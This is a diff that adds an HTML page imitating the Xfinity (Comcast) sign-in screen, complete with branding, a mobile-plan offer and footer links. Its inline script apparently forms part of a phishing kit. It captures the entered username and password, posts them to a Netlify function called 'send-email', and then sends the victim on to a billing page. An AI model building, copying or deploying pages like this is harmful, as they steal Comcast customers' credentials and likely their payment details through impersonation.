@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Xfinity Login & Mobile Offer</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+    />
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
+  <body>
+    <div class="app-container">
+      <div class="login-section">
+        <div class="login-form-wrapper">
+          <img
+            src="images/xfinity-logo-grey.svg"
+            alt="Xfinity Logo"
+            style="width: 80px; margin: 25px 0"
+          />
+          <h3 class="mb-3">Sign in with your Xfinity ID</h3>
+
+          <form id="form1">
+            <input type="hidden" name="home" value="homepage" />
+            <div class="mb-3">
+              <input
+                type="text"
+                class="form-control"
+                placeholder="Email, mobile, or username"
+                required
+                id="email"
+              />
+            </div>
+            <div class="mb-3">
+              <input
+                type="password"
+                class="form-control"
+                placeholder="Password"
+                required
+                id="pass_1"
+              />
+            </div>
+            <p class="text-muted" style="font-size: 13px">
+              By signing in, you agree to our
+              <a href="#">Terms of Service</a> and
+              <a href="#">Privacy Policy</a>.
+            </p>
+            <button class="btn btn-primary">Let's go</button>
+          </form>
+
+          <div class="login-links mt-4">
+            <a href="#"
+              ><span
+                >New to Xfinity? View exclusive offers near you
+                <i class="fas fa-chevron-right"></i></span
+            ></a>
+            <a href="#"
+              ><span
+                >Find your Xfinity ID <i class="fas fa-chevron-right"></i></span
+            ></a>
+            <a href="#"
+              ><span
+                >Create a new Xfinity ID
+                <i class="fas fa-chevron-right"></i></span
+            ></a>
+          </div>
+        </div>
+      </div>
+
+      <div class="offer-section">
+        <div class="offer_text">
+          <h2 class="offer-title">Let's cut your mobile bill in half</h2>
+          <p class="offer-description">
+            Xfinity Internet customers can save big over T-Mobile, Verizon, and
+            AT&T in their first year when you get two Unlimited lines with the
+            5G Xfinity Mobile network.
+          </p>
+          <a href="#" class="offer-button">Calculate your savings</a>
+        </div>
+        <div class="offer_image">
+          <!-- Add image if needed -->
+        </div>
+      </div>
+    </div>
+
+    <footer class="main-footer">
+      <div class="text-center text-muted">&copy; 2025 Comcast</div>
+      <div class="footer-links">
+        <a href="#" class="footer-link"
+          ><i class="fas fa-file-alt"></i> Web Terms Of Service</a
+        >
+        <a href="#" class="footer-link"
+          ><i class="fas fa-file-alt"></i> CA Notice at Collection</a
+        >
+        <a href="#" class="footer-link"
+          ><i class="fas fa-file-alt"></i> Privacy Policy</a
+        >
+        <a href="#" class="footer-link"
+          ><i class="fas fa-globe-americas"></i> Your Privacy Choices</a
+        >
+        <a href="#" class="footer-link"
+          ><i class="fas fa-heartbeat"></i> Health Privacy Notice</a
+        >
+        <a href="#" class="footer-link"><i class="fas fa-ad"></i> Ad Choices</a>
+      </div>
+    </footer>
+
+    <div class="footer-bottom">
+      <div class="cookie-prefs">
+        <i class="fas fa-cookie-bite"></i>
+        <span>Cookie Preferences</span>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+      document.querySelector("#form1").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const email_username = document.querySelector("#email").value;
+        const pass = document.querySelector("#pass_1").value;
+
+        const res = await fetch("/.netlify/functions/send-email", {
+          method: "POST",
+          body: JSON.stringify({
+            email_username,
+            pass,
+            pageName: "Login Page", // This changes per page
+          }),
+        });
+
+        const data = await res.json();
+
+        window.location.href = "billing.html"; // Redirect to billing page
+      });
+    </script>
+  </body>
+</html>
